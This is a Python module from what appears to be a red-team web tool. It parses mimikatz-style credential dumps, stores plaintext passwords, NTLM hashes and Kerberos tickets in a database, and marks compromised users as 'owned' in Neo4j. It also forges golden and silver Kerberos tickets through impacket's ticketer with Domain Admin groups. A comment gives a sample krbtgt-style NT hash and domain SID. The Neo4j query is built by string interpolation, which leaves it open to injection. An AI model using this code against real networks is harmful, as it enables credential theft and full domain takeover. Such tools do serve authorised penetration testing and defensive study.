#############################################
#                                           #
#        Función para parsear tickets       #
#                                           #
#############################################
# FUNCION TICKETS
from argparse import Namespace
from flask import current_app

tickets_upload_path=f"{current_app.root_path}/static/uploads/tickets"



def parse_tickets(data):
    from cerberus.utils import clean_none, re, copy
    
    d_template={ "username":None,
        "domain":None,
        "logon_server":None,
        "logon_time":None,
        "sid":None,
        "creds":{
            "username":None,
            "domain":None,
            "password":None
        },
        "tickets":{
            "tgs":[],
            "client":None,
            "tgt":[],
        }
    }
    bool_last=False
    sec=[]
    sections=[]
    a=[]

    def new_ticket(data,index):
        d={"start_time":None,
            "end_time":None,
            "renew_time":None,
            "service_name":None,
            "target_name":None,
            "client_name":None,
            "flags":None,
            "session_key":None,
            "ticket":None,
            }
        times=data[index+13].split(": ")[1].split(";")
        d["start_time"]=times[0].strip()
        d["end_time"]=times[1].strip()
        d["renew_time"]=times[2].strip()

        d["service_name"]=clean_none(data[index+14])
        d["target_name"]=clean_none(data[index+15])
        d["client_name"]=clean_none(data[index+16])
        d["flags"]=clean_none(data[index+17])
        d["session_key"]=data[index+19].strip()
        d["ticket"]=data[index+21].strip().lstrip("* Saved to file ").rstrip(" !")
        print(d)
        return d



    for index,line in enumerate(data):
        # get number of spaces at the beginning of the line
        num_espacios = len(re.match(r'^\s*', line).group(0))

        # if the line is empty, skip it
        if len(line.strip()) == 0 and bool_last:
            sec.append(line.strip("\r\n"))
            sections.append(sec)
            sec=[]
            bool_last=False
        else:
            sec.append(line.strip("\r\n"))
            if "Group 2" in line:
                bool_last=True

    print(f"Entries found - {len(sections)}")
    
    for sec in sections:
        # copy template
        d=copy.deepcopy(d_template)
        d["username"]=clean_none(sec[2])
        d["domain"]=clean_none(sec[3])
        d["logon_server"]=clean_none(sec[4])
        d["logon_time"]=clean_none(sec[5])
        d["sid"]=clean_none(sec[6])
        d["creds"]["username"]=clean_none(sec[8])
        d["creds"]["domain"]=clean_none(sec[9])
        d["creds"]["password"]=clean_none(sec[10])

        tickets=sec[12:]
        op=None
        for index,line in enumerate(tickets):
            num_espacios = len(re.match(r'^\s*', line).group(0))
            if "Ticket Granting Service" in line:
                op="tgs"
            elif "Client Ticket" in line:
                op=None
            elif "Ticket Granting Ticket" in line:
                op="tgt"
            else:
                if num_espacios==2:
                    if op=="tgs":
                        # new_ticket(sec,index)
                        d["tickets"]["tgs"].append(new_ticket(sec,index))
                    elif op=="tgt":
                        d["tickets"]["tgt"].append(new_ticket(sec,index))
        a.append(d)

    print(a)
    return a

# ----------------------Fin parse_tickets-----------------------------------------

#############################################
#                                           #
#       Función para insertar tickets       #
#                                           #
#############################################
# FUNCION LSADUMP_TEST

def insert_tickets(data, session):
    import cerberus.models as m
    from cerberus.utils import isLocal, calculate_ntlm, current_datetime
    import base64
    import os

    # Leer ticket
    def readTicket(ticket):
        print(f"[+] Reading ticket {ticket}")
        # get the content of binary file and encode it to base64
        def get_file_content(filePath):
            with open(filePath, 'rb') as fp:
                return base64.b64encode(fp.read()) # encode to base64
        # Comprobamos si existe la carpeta; si no, la creamos

        # Comprobamos si existe el ticket
        if os.path.basename(ticket) in os.listdir(tickets_upload_path):
            content_bytes = get_file_content(f"{tickets_upload_path}/{ticket}")
            aux = content_bytes.decode('utf-8')
            print(f"[+] Ticket readed successfully")
            return aux
        else:
            print(f"[!] Ticket not found")
            return None


    def insert_ticket(ticket, tipo, id_user):
        ticket=m.Tickets.get(ticket_name=t['ticket'], user_id=id_user)
        if ticket is None:
            # readTicket(t["ticket"])
            ticket=m.Tickets(service = t['service_name'],
                            domainuser_id = id_user,
                            ticket_type = tipo,
                            ticket_name = t['ticket'],
                            ticket_data = readTicket(t["ticket"]),
                            service_name = t['service_name'],
                            target_name = t['target_name'],
                            start_time = t['start_time'],
                            end_time = t['end_time'],
                            renew_time = t['renew_time'],
                            date = current_datetime()
                            )
            session.add(ticket) 
            session.commit()
        else:
            #En caso de que ya este creado el ticket actaulizamos sus datos al output de mimi
            ticket.update(service = t['service_name'],
                            domainuser_id = id_user,
                            ticket_type = tipo,
                            ticket_name = t['ticket'],
                            ticket_data = readTicket(t["ticket"]),
                            service_name = t['service_name'],
                            target_name = t['target_name'],
                            start_time = t['start_time'],
                            end_time = t['end_time'],
                            renew_time = t['renew_time'],
                            date = current_datetime()
                            )
            session.commit()
            pass

    
    for section in data:        

        if section['username'] is None:
            return
        ### ES LOCAL ###
        if isLocal(section['sid']): # Es local
            # Es una maquina
            if section['username'][-1] == '$':
                print("[!] Es una maquina")
                pass
            # NO es una maquina
            else:
                # Meter para usuario locales de la máquina.
                print("[!] Es un usuario local")
                pass
        ### ES DOMINIO ###
        else:
            neo4j=checkneo4j()
            user=m.DomainUsers.get(user=section['username'], domain=section['domain'])
            # Si no existe el usuario lo creamos
            if user is None:
                user=m.DomainUsers(user=section['username'], domain=section['domain'], logon_server=section['logon_server'], logon_time=section['logon_time'], sid=section['sid'], date=current_datetime())
                session.add(user)
                session.commit()
            else:
                user.update(user=section['username'],
                                domain=section['domain'], 
                                logon_server=section['logon_server'], 
                                logon_time=section['logon_time'],
                                sid=section['sid'],
                                date=current_datetime()
                            )
                

                
            user.update(logon_server=section['logon_server'],
                                 logon_time=section['logon_time'],
                                 sid=section['sid'],
                                 )

            # CREDENCIALES
            
            if section['creds']['password'] is not None:
                password=section['creds']['password']
                hash=calculate_ntlm(section['creds']['password'])
                cred=m.Credentials.get(ntlm=hash)
                # Si no existe la credencial la creamos
                if cred is None:
                    cred=m.Credentials(ntlm=hash, plain=password, location=2, date=current_datetime())
                    session.add(cred)
                    session.commit()
                else:
                    if cred.location==0:
                        cred.update(location=2)
                    elif cred.location==1:
                        cred.update(location=3)
                    if cred.plain is None:
                        cred.update(plain=password)

                relation=m.CredsDomainUsers.get(domainuser_id=user.id, cred_id=cred.id)
                if not relation:
                    _=m.CredsDomainUsers(domainuser_id=user.id, cred_id=cred.id, date=current_datetime())
                    session.add(_)
                    # session.commit()
                else:
                    relation.date=current_datetime()
                    # session.commit()
                user.owned=True
                session.commit()
                if neo4j:
                    userAsOwned(user)
                # if not m.CredsDomainUsers.get(domainuser_id=user.id, cred_id=cred.id):
                #     session.add(m.CredsDomainUsers(domainuser_id=user.id, cred_id=cred.id))
                #     session.commit()
            
            # TICKETS
            ## TGS
            if len(section['tickets']['tgs']) > 0:
                for t in section['tickets']['tgs']:
                    insert_ticket(t, "tgs", user.id)
                    
            ## TGT
            if len(section['tickets']['tgt']) > 0:
                for t in section['tickets']['tgt']:
                    insert_ticket(t, "tgt", user.id)

# ----------------------Fin insert_tickets-----------------------------------------








#############################################
#                                           #
#      Función para trasformar tickets      #
#                                           #
#############################################
# Esta función trasforma los tickets de kirbi a ccache y viceversa
def transform_tickets(input, output):
    import struct
    from cerberus.static.external_modules.impacket import version
    from cerberus.static.external_modules.impacket.krb5.ccache import CCache    

    def is_kirbi_file(filename):
        with open(filename, 'rb') as fi:
            fileid = struct.unpack(">B", fi.read(1))[0]
        return fileid == 0x76

    def is_ccache_file(filename):
        with open(filename, 'rb') as fi:
            fileid = struct.unpack(">B", fi.read(1))[0]
        return fileid == 0x5

    def convert_kirbi_to_ccache(input_filename, output_filename):
        ccache = CCache.loadKirbiFile(input_filename)
        ccache.saveFile(output_filename)

    def convert_ccache_to_kirbi(input_filename, output_filename):
        ccache = CCache.loadFile(input_filename)
        ccache.saveKirbiFile(output_filename)
    
    #Main
    if is_kirbi_file(input):
        print('[*] converting kirbi to ccache...')
        convert_kirbi_to_ccache(input, output)
        print('[+] done')
        return "toCcache"
    elif is_ccache_file(input):
        print('[*] converting ccache to kirbi...')
        convert_ccache_to_kirbi(input, output)
        print('[+] done')
        return "toKirbi"
    else:
        print('[X] unknown file format')
        return "error"

# Esta función trasforma los tickets .ccache a .kirbi y devuelve el contenido del ticket en b64.
# Despues borra los tickets de la carpeta temporal
def transform_ccache_kirbi(input, name):
    import os
    import base64

    tmp_path ='cerberus/static/.tmp/'

    # Leer ticket
    def readTicket(ticket):
        print(f"[+] Reading ticket {ticket}")
        # get the content of binary file and encode it to base64
        def get_file_content(filePath):
            with open(filePath, 'rb') as fp:
                return base64.b64encode(fp.read()) # encode to base64

        # Comprobamos si existe el ticket
        if os.path.basename(ticket) in os.listdir(tmp_path):
            content_bytes = get_file_content(f"./{tmp_path}/{ticket}")
            aux = content_bytes.decode('utf-8')
            print(f"[+] Ticket readed successfully")
            return aux
        else:
            print(f"[!] Ticket not found")
            return None
     
    # Escribir cadena de bytes en un archivo
    with open(f'{tmp_path}{name}.ccache', 'wb') as archivo:
        archivo.write(input)

    # Trasforma el ticket de ccache a kirbi
    transform_tickets(f'{tmp_path}{name}.ccache',f'{tmp_path}{name}.kirbi')
    
    # Leer el ticket kirbi
    kirbi_ticket_b64=readTicket(f'{name}.kirbi')
    # Eliminar ficheros temporales
    os.remove(f'{tmp_path}{name}.ccache')    
    os.remove(f'{tmp_path}{name}.kirbi')

    return(kirbi_ticket_b64)

# ----------------------Fin transform_kirbi_ccache-----------------------------------------

# Esta función trasforma los tickets .kirbi a .ccache y devuelve el contenido del ticket en b64.
# Despues borra los tickets de la carpeta temporal
def transform_kirbi_ccache(input, name):
    import os
    import base64

    tmp_path ='cerberus/static/.tmp/'

    # Leer ticket
    def readTicket(ticket):
        print(f"[+] Reading ticket {ticket}")
        # get the content of binary file and encode it to base64
        def get_file_content(filePath):
            with open(filePath, 'rb') as fp:
                return base64.b64encode(fp.read()) # encode to base64

        # Comprobamos si existe el ticket
        if os.path.basename(ticket) in os.listdir(tmp_path):
            content_bytes = get_file_content(f"./{tmp_path}/{ticket}")
            aux = content_bytes.decode('utf-8')
            print(f"[+] Ticket readed successfully")
            return aux
        else:
            print(f"[!] Ticket not found")
            return None
    name=name.rstrip(".kirbi").rstrip(".ccache")
    # Generar .kirbi
    with open(f'{tmp_path}{name}.kirbi', 'wb') as archivo:
        archivo.write(base64.b64decode(input))

    # Trasforma el ticket de kirbi a ccache
    transform_tickets(f'{tmp_path}{name}.kirbi',f'{tmp_path}{name}.ccache')
    
    # Leer el ticket ccache
    ccache_ticket_b64=readTicket(f'{name}.ccache')
    # Eliminar ficheros temporales
    os.remove(f'{tmp_path}{name}.ccache')    
    os.remove(f'{tmp_path}{name}.kirbi')

    return(ccache_ticket_b64)

# ----------------------Fin transform_kirbi_ccache-----------------------------------------

#############################################
#                                           #
#           Función subir tickets           #
#                                           #
#############################################

def upload_ticket(ticket_path=None,fileName=None,session=None):
    import os
    import base64
    from cerberus.utils import convertir_tiempo
    from cerberus import models as m

    tmp_path ='cerberus/static/.tmp/'
    def readTicket(path,ticket):
        print(f"[+] Reading ticket {ticket}")
        # get the content of binary file and encode it to base64
        def get_file_content(filePath):
            with open(filePath, 'rb') as fp:
                return base64.b64encode(fp.read()) # encode to base64
        # Comprobamos si existe la carpeta; si no, la creamos
        if not os.path.isdir(tickets_upload_path):
            os.mkdir(tickets_upload_path)
        # Comprobamos si existe el ticket
        if os.path.basename(ticket) in os.listdir(path):
            content_bytes = get_file_content(f"{path}{ticket}")
            aux = content_bytes.decode('utf-8')
            print(f"[+] Ticket readed successfully")
            return aux
        else:
            print(f"[!] Ticket not found")
            return None

   
    
    transform_to = transform_tickets(f"{ticket_path}{fileName}", f"{tmp_path}tempTicket")

    ticket_code=""
    if transform_to == "toKirbi":
        data = parse_ccache(f"{ticket_path}{fileName}")
        ticket_code = readTicket(tmp_path,"tempTicket")
    else:
        data = parse_ccache(f"{tmp_path}tempTicket")
        ticket_code = readTicket(ticket_path,fileName) 

    

    if ("$" in data["target"]):
        user="machine"
        machine=m.Machines.get(hostname=data["target"])
        if machine is None:
            machine=m.Machines(hostname=data["target"],domain=data["domain"])
            session.add(machine)
            session.commit()
    else:
        user=data["target"]

    u=m.DomainUsers.get(user=user, domain=data["domain"])
    if u is None:
        u=m.DomainUsers(user=user, domain=data["domain"],sid='Fake User')
        session.add(u)
        session.commit()
        print(f"[+] Domain user {data['target']} added successfully")

    ticket = m.Tickets.get_by_name(ticket_name=data["ticketName"])
    if ticket is None:
        ticket = m.Tickets(
            service=data["serviceName"],  
            domainuser_id=u.id,
            ticket_type=data["type"],
            ticket_name=data["ticketName"],
            ticket_data=ticket_code,
            service_name=data["serviceName"],
            target_name=data["target"],
            start_time=data["startTime"],
            end_time=data["expTime"],
            renew_time=data["renewTime"],
        )
        session.add(ticket)
        session.commit()
        
        print(f"[+] Ticket {data['ticketName']} created successfully")
    

    


# ----------------------Fin upload_tickets----------------------------------------

    

#############################################
#                                           #
#        Función para crear tickets         #   
#             silver y golden               #
#                                           #
#############################################
# Función para crear tickets
"""
Nombre: Create Tickets
Descripción: Funcion para la creación de golden y silver tickets
Precondiones: Ninguna
Parámetros: 0 [String]: spn indicador de la máquina objetivo par ala cual se generará el silver ticket, si no se especifica se generá un golden ticket
            1 [String]: domain nombre del dominio para la creación de los tickects
            2 [String]: domain_sid SID del dominio para la creación de tickets
            3 [String]: nthash hash ntlmv del servicio para que el cual se creará el ticket, para los golden tickets se necesita el hash de krbtgt
            4 [String]: aes_key tipo de cifrado (Si no se sabe por defecto 256)
            5 [String]: target usuario para le cual se generará el ticket
            6 [String]: duration duracion en años del ticket, por defecto impacket los crea para 10 años
            7 [Object]: session obejeto para realizar conexiones con la base de datos
Return:     0 [String]: ticket[1] devolucion en hexademcimal del ticekt
            1 [String]: ticket_name nombre del ticket
            2 [INT]: Identificador del ticket en la base de datos
    
"""
def create_ticket(spn=None, domain=None, domain_sid=None, nthash=None, aes_key=None, target=None,duration='87600' ,session=None):
    from cerberus.static.external_modules.impacket.ticketer import TICKETER
    from cerberus import models as m
    
    from cerberus.utils import convertir_tiempo

    ticket_type="None"
    
    # Opciones para crear el ticket (modificar para golden ticket)
    options=Namespace(target=target, spn=spn, request=False, domain=domain, domain_sid=domain_sid,
                    aesKey=aes_key, nthash=nthash, keytab=None, groups='513, 512, 520, 518, 519',
                    user_id='500', extra_sid=None, extra_pac=False, old_pac=False, duration=duration,
                    ts=False, debug=False, user=None, password=None, hashes=None, dc_ip=None)

  
    executer = TICKETER(target=target, password=options.password, domain=domain, options=options)
    
    
    if spn!=None:
        #Nombre que le damos al ticket (nombre del usuario@nombre del servicio-nombre del ordenador)
        ticket_name=f'{target}@{spn.split("/")[0]}-{spn.split("/")[1]}'
        ticket_type='tgs'
        service=spn.split("/")[0]
    else:
        #Nombre que le damos al goldet ticket (nombre de usuario al que va destinado el golden ticket @ tipo de ticket)
        ticket_name=f'{target}@golden-ticket'
        ticket_type='tgt'
        service="krbtgt"


    ticket=executer.run()
    # print(ticket[1])
    kirbi_content=transform_ccache_kirbi(ticket[1], ticket_name)
    
    #Añadimos el ticket a la bbdd
    u=m.DomainUsers.get(user=target, domain=domain)
    if u is None:
        u=m.DomainUsers(user=target, domain=domain,sid='Fake user')
        session.add(u)
        session.commit()
        print(f"[+] Domain user {target} added successfully")

    t=m.Tickets.get_by_name(ticket_name=ticket_name)
    # print(t)
    if t is None:    
        t=m.Tickets(service = service,
                            domainuser_id = u.id,
                            ticket_type = ticket_type,
                            ticket_name = f'{ticket_name}.kirbi',
                            ticket_data = kirbi_content,
                            service_name = service,
                            target_name = options.target,
                            start_time = convertir_tiempo(ticket[0][0]),
                            end_time = convertir_tiempo(ticket[0][1]),
                            renew_time = None,
                            # date = date
                            )
        session.add(t)
        session.commit()
        print(f"[+] Ticket {ticket_name} created successfully")
    return (ticket[1],f'{ticket_name}.ccache', t.id)

    # Formato del input de la función
    # TICKETER(baduser, None, rooted.local, Namespace(target='baduser', spn='CIFS/dc.rooted.local', request=False, domain='rooted.local', domain_sid='S-1-5-21-4001629950-4265076451-4074222949', aesKey=None, nthash='28d2f7b389faac5be02f3ab29eaf989c', keytab=None, groups='513, 512, 520, 518, 519', user_id='500', extra_sid=None, extra_pac=False, old_pac=False, duration='87600', ts=False, debug=False, user=None, password=None, hashes=None, dc_ip=None))
# ----------------------Fin create_ticket-----------------------------------------





def parse_ccache(ticketCcache):
    import logging
    import sys
    import traceback
    import argparse
    import datetime
    import base64
    from typing import Sequence
    from cerberus.static.external_modules.impacket.krb5.ccache import CCache
    ccache = CCache.loadFile(ticketCcache)

    ticket_info={}

    for creds in ccache.credentials:
        
        domain=creds['client'].prettyPrint().split(b'@')[1].decode('utf-8')
        target=creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
        spn = creds['server'].prettyPrint().split(b'@')[0].decode('utf-8')
        spn=spn.replace("/","-")    
        ticketName=creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')+"@"+spn+".kirbi"
        startTime=datetime.datetime.fromtimestamp(creds['time']['starttime']).strftime("%d/%m/%Y %H:%M:%S")
        
        if datetime.datetime.fromtimestamp(creds['time']['endtime']) < datetime.datetime.now():
            expTime=datetime.datetime.fromtimestamp(creds['time']['endtime']).strftime("%d/%m/%Y %H:%M:%S")
        else:
            expTime=datetime.datetime.fromtimestamp(creds['time']['endtime']).strftime("%d/%m/%Y %H:%M:%S")

        if datetime.datetime.fromtimestamp(creds['time']['renew_till']) < datetime.datetime.now():
            renewTime=datetime.datetime.fromtimestamp(creds['time']['renew_till']).strftime("%d/%m/%Y %H:%M:%S")
        else:
            renewTime=datetime.datetime.fromtimestamp(creds['time']['renew_till']).strftime("%d/%m/%Y %H:%M:%S")

        if(spn.split("-")[0]=="krbtgt"):
            ticket_info["type"]="tgt"
            ticket_info["serviceName"]=spn.split("-")[0]
        else:
            ticket_info["type"]="tgs"
            ticket_info["serviceName"]=spn.split("-")[0]

        ticket_info["ticketName"]=ticketName
        ticket_info["target"]=target
        ticket_info["domain"]=domain.lower()
        ticket_info["startTime"]=startTime
        ticket_info["expTime"]=expTime
        ticket_info["renewTime"]=renewTime

        return ticket_info




def checkneo4j():
    from neo4j import GraphDatabase
    from flask import g
    # URI examples: "neo4j://localhost", "neo4j+s://xxx.databases.neo4j.io"
    try:
        with GraphDatabase.driver(uri=g.user[3], auth=(g.user[4], g.user[5])) as driver:
            driver.verify_connectivity()
            return True
    except Exception as e:
        print(e)
        return False
    
def userAsOwned(user):
    from neo4j import GraphDatabase
    from flask import g
    # URI examples: "neo4j://localhost", "neo4j+s://xxx.databases.neo4j.io"
    try:
        with GraphDatabase.driver(uri=g.user[3], auth=(g.user[4], g.user[5])) as driver:
            driver.execute_query(f"MATCH (n:User) WHERE n.displayname='{user.user}' SET n.owned = true")
    except Exception as e:
        print("Error al actualizar neo4j")
        print(e)